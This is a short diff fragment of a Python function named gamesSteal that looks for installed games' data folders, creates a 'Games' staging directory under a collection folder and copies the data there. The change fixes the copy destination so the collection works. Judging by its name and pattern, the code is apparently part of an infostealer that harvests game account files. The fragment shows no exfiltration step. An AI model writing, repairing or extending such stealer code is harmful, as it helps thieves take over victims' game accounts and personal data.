@@ -62,7 +62,7 @@ def gamesSteal(kingFolder: str) -> None:
                 if os.path.exists(paths):
                     tempDir: str = os.path.join(kingFolder, 'Games', name)
                     os.makedirs(tempDir, exist_ok=True)
-                    __copy_data__(paths, new_path)
+                    __copy_data__(paths, tempDir)
         else:
             if os.path.exists(value):
                 new_path: str = os.path.join(kingFolder, gameName)
